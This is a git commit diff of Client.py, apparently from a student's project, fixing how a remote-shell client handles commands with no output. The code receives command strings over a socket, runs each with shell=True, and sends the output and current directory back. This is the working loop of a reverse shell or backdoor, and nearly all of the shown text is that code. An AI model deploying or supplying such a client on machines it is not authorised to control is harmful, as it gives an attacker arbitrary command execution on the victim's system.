d6e6aa5a5ffbf6285f5536610894e952372f88da
oribendror <oribendror@mail.tau.ac.il>
2025-04-06 23:44:23 +0300

    fix to commands without stdout not stopping

--- Client.py
+++ Client.py
@@ -15,11 +15,11 @@ while True:
         s.send(str.encode(str(os.getcwd() + '$ ')))  # Send the updated directory as a response
         continue
     if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout=subprocess.PIPE, stderr= subprocess.PIPE,stdin=subprocess.PIPE)
+        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_bytes, "utf-8")
+        output_str = output_bytes.decode("utf-8", errors='ignore')
         s.send(str.encode(output_str + str(os.getcwd() + '$ ')))
-        print(output_str)
-
+        print(output_str, end='')
+        
 # Close connection
 s.close()
